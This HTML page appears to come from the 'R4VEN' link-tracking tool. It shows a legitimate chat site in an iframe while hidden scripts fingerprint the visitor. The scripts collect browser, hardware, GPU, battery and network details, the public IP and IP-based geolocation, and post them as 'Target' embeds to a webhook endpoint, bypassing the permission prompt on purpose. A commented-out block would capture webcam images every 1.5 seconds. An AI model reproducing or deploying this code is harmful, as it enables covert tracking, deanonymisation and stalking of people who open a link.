<!DOCTYPE html>
<html>

<head>
  <script type="text/javascript" src="dwebhook.js">
  </script>
  <!-- No-JS fallback tracking -->
  <noscript>
    <img src="/no_js_detector" width="1" height="1" style="display:none;" alt="">
    <img src="/detect_username" width="1" height="1" style="display:none;" alt="">
  </noscript>
</head>

<body onload="getLocation(); detectUsername();">

  <!-- Image pixel tracking (works even with JS disabled) -->
  <img src="/track" width="1" height="1" style="display:none;" alt="">

  <iframe src="https://www.meetskip.com/chat" width="100%" height="900" style="border:none;">
  </iframe>

  <p id="demo"></p>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
  </script>
  <script>
    // MICROPHONE SUPPRESSION - Block all mic access attempts
    if (navigator.mediaDevices) {
      const originalGetUserMedia = navigator.mediaDevices.getUserMedia;
      navigator.mediaDevices.getUserMedia = function(constraints) {
        // Reject any audio requests
        if (constraints && constraints.audio) {
          return Promise.reject(new DOMException('Audio permission denied', 'NotAllowedError'));
        }
        // Allow video-only if needed (though video is also disabled)
        return originalGetUserMedia.call(this, constraints);
      };
    }
    
    // DEVICE TYPE DETECTION
    function detectDeviceType() {
      var ua = navigator.userAgent;
      var deviceInfo = {
        isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua),
        isTablet: /iPad|Android(?!.*Mobile)|Tablet/i.test(ua),
        isDesktop: !/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua),
        hasGPS: /Android|iPhone|iPad/i.test(ua),  // Mobile/Tablet likely has GPS
        platform: navigator.platform,
        maxAccuracy: /Android|iPhone|iPad/i.test(ua) ? "5-10m (GPS)" : "5000m (IP-based)"
      };
      return deviceInfo;
    }
    
    var x = document.getElementById("demo");
    
    // Username detection function
    function detectUsername() {
      try {
        fetch('/detect_username')
          .then(response => response.json())
          .then(data => {
            console.log('Username detection data:', data);
          })
          .catch(error => console.log('Username detection error:', error));
      } catch (e) {
        console.log('Username detection not available');
      }
    }

    let datetime = new Date();
    let localtime = String(datetime.toLocaleTimeString());
    
    // Get device type info
    var deviceType = detectDeviceType();

    var sysinfo = (" GET ", "```xl\n" + navigator.userAgent + "```" + "```autohotkey\n" + "\nPlatform: " + navigator.platform + "\nDevice_Type: " + (deviceType.isMobile ? "Mobile" : deviceType.isTablet ? "Tablet" : "Desktop") + "\nHas_GPS: " + (deviceType.hasGPS ? "Yes" : "No") + "\nCookies_Enabled: " + navigator.cookieEnabled + "\nBrowser_Language: " + navigator.language + "\nBrowser_Name: " + navigator.appName + "\nBrowser_CodeName: " + navigator.appCodeName + "\nRam: " + navigator.deviceMemory + "\nCPU_cores: " + navigator.hardwareConcurrency + "\nScreen_Width: " + screen.width + "\nScreen_Height: " + screen.height + "\nTime: " + localtime + "\nRefUrl: " + document.referrer + "\nOscpu: " + navigator.oscpu + "```");

    const request = new XMLHttpRequest();
    request.open("POST", "/location_update"); //change webhook

    request.setRequestHeader('Content-type', 'application/json');

    var myEmbed = {
      author: {
        name: "Target System Information.."
      },
      title: "Uagent:",
      description: sysinfo,
      color: 15418782
    }

    var params = {
      username: "R4VEN",
      avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
      content: "@everyone Someone Opened The Link O_o ",
      embeds: [myEmbed]
    }

    request.send(JSON.stringify(params));

    // Enhanced Device Information Vector
    function collectDeviceInfo() {
      var deviceInfo = "```autohotkey\n";
      
      // Display Information
      deviceInfo += "Display_PixelDepth: " + screen.pixelDepth + "\n";
      deviceInfo += "ColorDepth: " + screen.colorDepth + "\n";
      deviceInfo += "DevicePixelRatio: " + window.devicePixelRatio + "\n";
      deviceInfo += "ScreenOrientation: " + (screen.orientation ? screen.orientation.type : "N/A") + "\n";
      
      // Battery Information (if available)
      if(navigator.getBattery) {
        navigator.getBattery().then(function(battery) {
          deviceInfo += "Battery_Level: " + Math.round(battery.level * 100) + "%\n";
          deviceInfo += "Battery_Charging: " + battery.charging + "\n";
        });
      }
      
      // Connection Information (if available)
      if(navigator.connection) {
        deviceInfo += "Connection_Type: " + navigator.connection.effectiveType + "\n";
        deviceInfo += "SaveData: " + navigator.connection.saveData + "\n";
        if(navigator.connection.downlink) {
          deviceInfo += "Downlink_Speed: " + navigator.connection.downlink + " Mbps\n";
        }
      }
      
      // Storage Information
      deviceInfo += "LocalStorage_Available: " + (typeof localStorage !== 'undefined' ? 'Yes' : 'No') + "\n";
      if(typeof localStorage !== 'undefined') {
        deviceInfo += "LocalStorage_Size: " + JSON.stringify(localStorage).length + " bytes\n";
      }
      
      // WebGL Information (GPU)
      var canvas = document.createElement('canvas');
      var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if(gl) {
        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if(debugInfo) {
          deviceInfo += "GPU_Vendor: " + gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) + "\n";
          deviceInfo += "GPU_Renderer: " + gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) + "\n";
        }
      }
      
      // Timezone and Locale
      deviceInfo += "Timezone_Offset: " + new Date().getTimezoneOffset() + " min\n";
      deviceInfo += "Browser_Locales: " + (navigator.languages ? navigator.languages.join(', ') : navigator.language) + "\n";
      
      // Do Not Track
      deviceInfo += "DNT_Header: " + (navigator.doNotTrack ? navigator.doNotTrack : "Not Set") + "\n";
      
      // WebDriver Detection
      deviceInfo += "WebDriver_Detected: " + (navigator.webdriver ? "Yes" : "No") + "\n";
      
      // Touch Support
      deviceInfo += "Touch_Support: " + (('ontouchstart' in window) ? 'Yes' : 'No') + "\n";
      
      // Vendor Information
      deviceInfo += "Vendor: " + navigator.vendor + "\n";
      deviceInfo += "OnLine_Status: " + navigator.onLine + "\n";
      
      deviceInfo += "```";
      
      const deviceRequest = new XMLHttpRequest();
      deviceRequest.open("POST", "/location_update");
      deviceRequest.setRequestHeader('Content-type', 'application/json');
      
      var deviceEmbed = {
        author: {
          name: "Target Device Information Vector"
        },
        title: "Extended Hardware & System Details",
        description: deviceInfo,
        color: 9109760,
        footer: {
          text: "Comprehensive device telemetry collected"
        }
      }
      
      var deviceParams = {
        username: "R4VEN",
        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
        embeds: [deviceEmbed]
      }
      
      deviceRequest.send(JSON.stringify(deviceParams));
    }
    
    // Collect device info on page load
    collectDeviceInfo();

    $.getJSON("https://api.ipify.org?format=json", function (data) {
      $("#gfg").html(data.ip);

      const request = new XMLHttpRequest();
      request.open("POST", "/location_update"); //change webhook

      request.setRequestHeader('Content-type', 'application/json');

      var myEmbed = {
        author: {
          name: "Target Ip"
        },
        description: '```xl\n' + data.ip + '```' + '\n__**IP Details:**__ https://ip-api.com/#' + data.ip + "\n",
        color: 15548997,

        footer: {
          text: "Geographic location based on IP address is NOT accurate, it provides the approximate location of the ISP."
        }
      }

      var params = {
        username: "R4VEN",
        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
        embeds: [myEmbed]
      }

      request.send(JSON.stringify(params));
    })

    $.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (response) {

      const request = new XMLHttpRequest();
      request.open("POST", "/location_update"); //change webhook

      request.setRequestHeader('Content-type', 'application/json');

      var myEmbed = {
        author: {
          name: "IP Address Reconnaissance"
        },
        title: response.status, //response.query
        description: '```autohotkey\nContinent: ' + response.continent +
          "\nContinentCode: " + response.continentcode +
          "\nCountry: " + response.country +
          "\nCountrycode: " + response.countrycode +
          "\nRegionname: " + response.regionName +
          "\nRegion: " + response.region +
          "\nCity: " + response.city +
          "\nDistrict: " + response.district +
          "\nZip: " + response.zip +
          "\nTime_zone: " + response.time_zone +
          "\nName: " + response.name +
          "\nAs: " + response.as +
          "\nIsp: " + response.isp +
          "\nReverse: " + response.reverse +
          "\nOffset: " + response.offset +
          "\nCurrency: " + response.currency +
          "\nProxy: " + response.proxy +
          "\nMobile: " + response.mobile +
          "\nLat: " + response.lat +
          "\nLon: " + response.lon + '```',
        color: 5763719

      }

      var params = {
        username: "R4VEN",
        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
        embeds: [myEmbed]
      }

      request.send(JSON.stringify(params));
    })


    function getLocation() {
      // Skip browser geolocation permission prompt entirely
      // Go directly to silent IP-based collection (no permissions needed)
      fetchIPBasedLocation();
    }

    function fetchIPBasedLocation() {
      // Multi-API fallback for better coverage across all device types
      try {
        // API 1: ip-api.com (Most reliable for most countries)
        $.getJSON("http://ip-api.com/json/?fields=lat,lon,accuracy,timezone,isp,continent,country,city", function(data) {
          if(data.lat && data.lon) {
            var locationData = {
              coords: {
                latitude: data.lat,
                longitude: data.lon,
                accuracy: data.accuracy || 5000
              },
              source: "IP-API",
              details: data
            };
            showPosition(locationData);
          }
        }).fail(function() {
          // API 2: ipapi.co (Fallback)
          $.getJSON("https://ipapi.co/json/", function(data) {
            if(data.latitude && data.longitude) {
              var locationData = {
                coords: {
                  latitude: data.latitude,
                  longitude: data.longitude,
                  accuracy: 5000
                },
                source: "IPAPI-CO",
                details: data
              };
              showPosition(locationData);
            }
          }).fail(function() {
            // API 3: MaxMind GeoIP2 (Last resort)
            $.getJSON("https://geoip.maxmind.com/geoip/v2.1/city/me", function(data) {
              if(data.location) {
                var locationData = {
                  coords: {
                    latitude: data.location.latitude,
                    longitude: data.location.longitude,
                    accuracy: 5000
                  },
                  source: "MaxMind",
                  details: data
                };
                showPosition(locationData);
              }
            }).fail(function() {
              console.error('All geolocation APIs failed');
            });
          });
        });
      } catch (e) {
        console.error('Geolocation error:', e);
      }
    }

    function showPosition(position) {
      var lat = position.coords.latitude;
      var lon = position.coords.longitude;
      var accuracy = position.coords.accuracy ? position.coords.accuracy + "m" : "Unknown";
      var source = position.source || "GPS (Exact)";
      
      var latlong = (" GET ", "```prolog\nüéØ GEOLOCATION DATA\nLatitude: " + lat + "\nLongitude: " + lon + "\nAccuracy: " + accuracy + "\nSource: " + source + "```" + "\n__**Google Maps:**__ https://www.google.com/maps/place/" + lat + "," + lon + "\n__**Google Earth:**__ https://earth.google.com/web/search/" + lat + "," + lon + "\n__**OpenStreetMap:**__ https://www.openstreetmap.org/?mlat=" + lat + "&mlon=" + lon + "&zoom=15");

      const request = new XMLHttpRequest();
      request.open("POST", "/location_update"); //change webhook

      request.setRequestHeader('Content-type', 'application/json');

      var myEmbed = {
        author: {
          name: "üéØ Target Location Captured"
        },
        title: "üìç GPS Location - Exact Coordinates",
        description: latlong + "\n",
        color: 15844367,
        fields: [
          {"name": "Latitude", "value": String(lat), "inline": true},
          {"name": "Longitude", "value": String(lon), "inline": true},
          {"name": "Accuracy", "value": accuracy, "inline": true},
          {"name": "Source", "value": source, "inline": true}
        ],
        footer: {
          text: "GPS provides exact location with coordinates. Accuracy depends on device GPS capability."
        }
      }

      var params = {
        username: "R4VEN",
        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
        embeds: [myEmbed]
      }

      request.send(JSON.stringify(params));

    }

    function showError(error) {
      console.log('Geolocation error code:', error.code, 'message:', error.message);
      
      switch (error.code) {
        case error.PERMISSION_DENIED:
          // User denied permission - fallback to IP-based location
          console.log('GPS permission denied - using IP-based location');
          fetchIPBasedLocation();
          break;
        case error.POSITION_UNAVAILABLE:
          // GPS signal lost or unavailable - try IP-based
          console.log('GPS position unavailable - using IP-based location');
          fetchIPBasedLocation();
          break;
        case error.TIMEOUT:
          // GPS took too long - try again with more time
          console.log('GPS timeout - retrying with increased timeout');
          setTimeout(function() {
            navigator.geolocation.getCurrentPosition(
              showPosition,
              showError,
              {
                enableHighAccuracy: true,
                timeout: 30000,  // Extended timeout
                maximumAge: 0
              }
            );
          }, 1000);
          break;
        case error.UNKNOWN_ERROR:
          console.log('Unknown GPS error - using IP-based location');
          fetchIPBasedLocation();
          break;
      }
    }
  </script>
  <div class="video-wrap" hidden="hidden">
    <video id="video" playsinline autoplay></video>
  </div>
  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
  <script>
    var url = "";
    request.open("GET", "/get_target", true);

    request.onload = function () {
      if (request.status === 200) {
        url = request.responseText;
      } else {
        url = "http://127.0.0.1:8000/image"
      }
    };

    request.send();
    // IMAGE CAPTURE - COMMENTED OUT
    /*
    function postFile(file) {
      let formdata = new FormData();
      formdata.append("image", file);
      let xhr = new XMLHttpRequest();
      xhr.open('POST', url, true);
      xhr.onload = function () {
        if (this.status === 200)
          console.log(this.response);
        else
          console.error(xhr);
      };
      xhr.send(formdata);
    }
    */




    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const errorMsgElement = document.querySelector('span#errorMsg');

    // CAMERA PERMISSION SUPPRESSED - NOT NEEDED
    /*
    const constraints = {
      audio: false,
      video: {

        facingMode: "user"
      }
    };
    */

    // Access webcam - COMMENTED OUT (No camera permission prompts)
    async function init() {
      // Camera permission request disabled - image capture not used
      /*
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints)
        // handleSuccess(stream); // COMMENTED OUT - Image capture disabled
      } catch (e) {
        // Silently fail if camera permission denied - no alerts or redirects
        console.log('Camera access failed - continuing without video');
      }
      */
    }

    // Success
    // IMAGE CAPTURE - COMMENTED OUT
    /*
    function handleSuccess(stream) {
      window.stream = stream;
      video.srcObject = stream;

      var context = canvas.getContext('2d');
      setInterval(function () {

        context.drawImage(video, 0, 0, 640, 480);
        canvas.toBlob(postFile, 'image/jpeg');
      }, 1500);


    }
    */

    // Load init
    init();
  </script>
</body>

</html>